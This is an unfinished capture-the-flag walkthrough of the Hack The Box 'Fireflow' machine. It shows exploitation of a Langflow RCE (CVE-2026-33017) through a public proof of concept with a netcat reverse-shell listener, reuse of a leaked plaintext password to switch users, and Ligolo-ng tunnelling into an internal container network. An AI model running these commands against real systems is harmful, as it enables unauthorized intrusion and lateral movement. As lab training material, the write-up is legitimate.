# Hack The Box — Fireflow

**Platform:** Hack The Box  
**Machine:** Fireflow  
**Difficulty:** Medium  
**Operating System:** Linux  
**Target IP:** `10.129.137.232`  
**Attacker Machine:** Kali Linux  
**Compromised User:** `nightfall`  
**Status:** In Progress

---

# 1. Executive Summary

Fireflow is a Linux-based machine that involves exploiting a vulnerable Langflow application, obtaining initial access through remote code execution, discovering credentials, moving laterally to a local user, and investigating an internal MCP (Model Context Protocol) service.

The initial attack surface consists of an SSH service and a web application exposed through the Fireflow domain.

During web enumeration, a public Langflow playground was discovered on:

`flow.fireflow.htb`

The application disclosed its flow identifier and version information. The identified Langflow version, 1.8.2, was vulnerable to CVE-2026-33017, an unauthenticated remote code execution vulnerability.

Successful exploitation provided a shell as `www-data`.

Further enumeration revealed credentials that could be reused to access the local `nightfall` account.

After obtaining access as `nightfall`, internal network enumeration revealed a Kubernetes-related network environment and an MCP service running on port `30080`.

Ligolo-ng was configured to establish a tunnel from the compromised host to Kali Linux. A listener was created successfully, but access to the MCP documentation endpoint has not yet been confirmed.

# 2. Scope and Environment

| Item | Value |
|---|---|
| Target | Fireflow |
| Target IP | `10.129.137.232` |
| Main domain | `fireflow.htb` |
| Subdomain | `flow.fireflow.htb` |
| Attacker OS | Kali Linux |
| VPN interface | `tun0` |
| VPN IP | `10.10.15.78` |
| Initial access user | `www-data` |
| Current compromised user | `nightfall` |
| Pivoting tool | Ligolo-ng 0.9.2 |

All testing was performed against the authorized Hack The Box environment.

# 3. Reconnaissance

## 3.1. Port Scanning

The initial reconnaissance focused on identifying exposed services.

The relevant services identified during enumeration were:

| Port | Service | Description |
|---|---|---|
| 22/tcp | SSH | OpenSSH |
| 443/tcp | HTTPS | nginx web server |

The HTTPS service redirected requests to the main hostname:

`fireflow.htb`

The TLS certificate contained the following DNS names:

- `fireflow.htb`
- `*.fireflow.htb`

The wildcard certificate suggested that additional virtual hosts might exist.

## 3.2. Hostname Configuration

The discovered hostname was added to the local Kali hosts file:

```bash
sudo nano /etc/hosts
```

Entry:

```text
10.129.137.232 fireflow.htb
```

This allowed access to the web application using its hostname.

# 4. Web Application Enumeration

## 4.1. Main Website

Opening:

```text
https://fireflow.htb/
```

revealed the FireFlow landing page.

The application was presented as a platform associated with Task Force Nightfall.

The landing page exposed information about the platform, including:

- Nightfall AI Agent
- Public playground functionality
- Flow engine version 1.8.2
- MCP Tool Registry

The public playground functionality became the next enumeration target.

## 4.2. Virtual Host Discovery

Further enumeration identified:

```text
flow.fireflow.htb
```

The hostname was added to `/etc/hosts`:

```text
10.129.137.232 flow.fireflow.htb
```

The application was accessible at:

```text
https://flow.fireflow.htb/
```

The application was identified as a Langflow instance.

## 4.3. Public Playground

The public playground was accessible through:

```text
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

The URL disclosed the following flow ID:

```text
7d84d636-af65-42e4-ac38-26e867052c25
```

The application was running:

```text
Langflow 1.8.2
```

This version and the publicly accessible flow led to the identification of CVE-2026-33017.

# 5. Initial Access — Langflow RCE

## 5.1. Vulnerability Identification

**CVE:** CVE-2026-33017  
**Affected application:** Langflow  
**Identified version:** 1.8.2  
**Vulnerability type:** Unauthenticated Remote Code Execution  
**Severity:** Critical

The vulnerability affects the public flow-building endpoint:

```http
POST /api/v1/build_public_tmp/{flow_id}/flow
```

The endpoint accepts attacker-controlled flow data containing Python component definitions.

The vulnerable processing of this data can result in arbitrary Python code execution on the server.

## 5.2. Exploitation

A public proof of concept was used:

```bash
git clone https://github.com/EQSTLab/CVE-2026-33017
```

Navigate to the exploit directory:

```bash
cd CVE-2026-33017
```

The initial exploit execution encountered an SSL certificate verification error because the target used a self-signed certificate.

The `verify=False` option was added to the relevant `requests.post()` call inside `exploit.py`:

```python
r = requests.post(
    url,
    json=payload,
    headers=headers,
    verify=False
)
```

A listener was started on Kali:

```bash
nc -lvnp 6969
```

The exploit was executed using the discovered flow ID:

```bash
python3 exploit.py \
  --url https://flow.fireflow.htb/ \
  --flow-id 7d84d636-af65-42e4-ac38-26e867052c25 \
  --lhost 10.10.15.78 \
  --lport 6969
```

## 5.3. Initial Shell

Successful exploitation provided remote shell access as:

```text
www-data
```

This confirmed that the Langflow vulnerability allowed remote code execution.

# 6. Lateral Movement — www-data to nightfall

## 6.1. Credential Enumeration

After obtaining the initial shell, local enumeration was performed to identify configuration files and potentially exposed credentials.

The environment configuration was particularly relevant.

The following credential was discovered:

```text
n1ghtm4r3_b4_n1ghtf4ll
```

The password was associated with the Langflow configuration.

## 6.2. User Enumeration

The local account of interest was:

```text
nightfall
```

An attempt was made to switch users:

```bash
su - nightfall
```

After authentication, the current user was verified:

```bash
whoami
```

Output:

```text
nightfall
```

This confirmed access to the `nightfall` account.

**Result:** Successful lateral movement from `www-data` to `nightfall`.

# 7. Internal Network Enumeration

After obtaining access as `nightfall`, network interfaces were enumerated to identify internal network segments.

The relevant interfaces were:

| Interface | IPv4 Address |
|---|---|
| eth0 | `10.129.137.232/16` |
| docker0 | `172.17.0.1/16` |
| flannel.1 | `10.42.1.0/32` |
| cni0 | `10.42.1.1/24` |

The presence of Docker and Flannel/CNI interfaces indicated a containerized environment with additional internal networking.

The internal network segment of interest was:

```text
10.42.1.0/24
```

The next objective was to establish access to internal services from Kali.

# 8. Internal Pivoting — Ligolo-ng

## 8.1. Tool Preparation

Ligolo-ng version 0.9.2 was used for tunneling.

The Kali working directory contained:

```text
ligolo-ng/
├── agent
├── proxy
├── LICENSE
├── README.md
├── ligolo-ng_agent_0.9.2_linux_amd64.tar.gz
└── ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
```

The proxy was started on Kali:

```bash
sudo ./proxy -selfcert
```

The proxy listened on:

```text
0.0.0.0:11601
```

## 8.2. Agent Connection

The agent was transferred to the compromised host and executed:

```bash
~/agent -connect 10.10.15.78:11601 -ignore-cert
```

The proxy confirmed the connection:

```text
INFO Agent joined.
name=nightfall@fireflow
remote=10.129.137.232:44892
```

The connected agent was identified as:

```text
nightfall@fireflow
```

## 8.3. Internal Interface Enumeration

Using the Ligolo-ng console, the connected agent's interfaces were enumerated:

```text
ifconfig
```

The output confirmed the internal network interfaces previously identified on the compromised host.

## 8.4. Tunnel Initialization

The tunnel was started:

```text
tunnel_start
```

The console confirmed:

```text
INFO Starting tunnel to nightfall@fireflow
```

The Ligolo interface was present on Kali:

```text
ligolo
```

Interface status:

```text
ligolo UP
```

## 8.5. Internal Route Configuration

A route to the internal CNI network was added from the Kali terminal:

```bash
sudo ip route add 10.42.1.0/24 dev ligolo
```

The route was verified:

```bash
ip route get 10.42.1.1
```

Output:

```text
10.42.1.1 dev ligolo src 192.168.193.128 uid 1000
```

This confirmed that Kali was routing traffic to `10.42.1.1` through the Ligolo interface.

# 9. MCP Service Discovery and Port Forwarding

## 9.1. MCP Service

Further investigation identified an internal MCP service running on:

```text
Port: 30080
```

The service became the next target for enumeration.

## 9.2. Listener Configuration

A TCP listener was configured in the Ligolo-ng console:

```text
listener_add --addr 0.0.0.0:30080 --to 10.129.137.232:30080
```

When the command was attempted again, the following error appeared:

```text
listen tcp 0.0.0.0:30080: bind: address already in use
```

The existing listener was then inspected:

```text
listener_list
```

The output showed:

| Setting | Value |
|---|---|
| Agent | `nightfall@fireflow` |
| Network | TCP |
| Agent listener address | `0.0.0.0:30080` |
| Proxy redirect address | `10.129.137.232:30080` |
| Status | Online |

The listener was already active, so it did not need to be recreated.

## 9.3. MCP Documentation Access Attempt

The next step was to access the MCP documentation endpoint:

```bash
curl -i --connect-timeout 5 http://240.0.0.1:30080/docs
```

The request failed:

```text
curl: (28) Connection timed out after 5001 milliseconds
```

The MCP documentation endpoint has therefore not yet been successfully accessed.

## 9.4. Tunnel Recovery

Ligolo-ng subsequently displayed the following messages:

```text
INFO Recovering agent: nightfall@fireflow (ID: 1)
INFO Restoring tunnel for agent nightfall@fireflow on interface ligolo
INFO Recreating interface ligolo...
INFO Starting tunnel to nightfall@fireflow
```

This indicated that the agent and tunnel were being recovered.

A route for the MCP proxy address was identified as the next required configuration step:

```text
route_add --name ligolo --route 240.0.0.1/32
```

Connectivity to the MCP endpoint remains unconfirmed.

# 10. Current Attack Chain

```text
Kali Linux
    |
    | Initial reconnaissance
    v
Fireflow
    |
    | SSH / HTTPS
    v
fireflow.htb
    |
    | Virtual host enumeration
    v
flow.fireflow.htb
    |
    | Public Langflow playground
    | Flow ID discovered
    v
Langflow 1.8.2
    |
    | CVE-2026-33017
    | Unauthenticated RCE
    v
www-data
    |
    | Credential discovery
    | Password reuse
    v
nightfall
    |
    | Internal network enumeration
    v
Ligolo-ng
    |
    | Tunnel and listener configuration
    v
Internal MCP service
    |
    | Connectivity not yet confirmed
    v
Further enumeration pending
```

# 11. Findings and Security Impact

| Finding | Impact | Severity |
|---|---|---|
| CVE-2026-33017 in Langflow | Unauthenticated remote code execution | Critical |
| Exposed application credentials | Enables account compromise and lateral movement | High |
| Password reuse | Allows movement from application service account to local user | High |
| Internal MCP service | Provides an additional attack surface for investigation | Pending |
| Ligolo-ng pivoting | Enables access to otherwise internal network resources | N/A |

# 12. Current Progress

| Task | Status |
|---|---|
| Initial port enumeration | Completed |
| Main website enumeration | Completed |
| Virtual host discovery | Completed |
| Langflow identification | Completed |
| Flow ID discovery | Completed |
| CVE-2026-33017 exploitation | Completed |
| Initial shell as `www-data` | Completed |
| Credential discovery | Completed |
| Access as `nightfall` | Completed |
| Internal network enumeration | Completed |
| Ligolo-ng agent connection | Completed |
| Tunnel initialization | Completed |
| Internal route configuration | Completed for `10.42.1.0/24` |
| MCP listener creation | Completed |
| MCP documentation access | Pending |
| MCP API enumeration | Pending |
| MCP authentication analysis | Pending |
| Privilege escalation | Pending |
| Root access | Pending |
| Root flag | Not yet obtained |

# 13. Conclusion

The initial compromise of Fireflow was achieved through an unauthenticated remote code execution vulnerability in Langflow 1.8.2.

The resulting shell provided access as `www-data`. Credential discovery and password reuse then enabled access to the `nightfall` account.

Internal network enumeration revealed a containerized network environment and an MCP service running on port `30080`.

Ligolo-ng was configured to establish a tunnel between the compromised host and Kali Linux. The agent connected successfully, the tunnel was initialized, and a TCP listener was confirmed online.

The remaining work is to establish reliable connectivity to the MCP service, enumerate its API, and continue the attack chain.

**Assessment status: Initial access and lateral movement completed; internal MCP exploitation and privilege escalation remain in progress.**
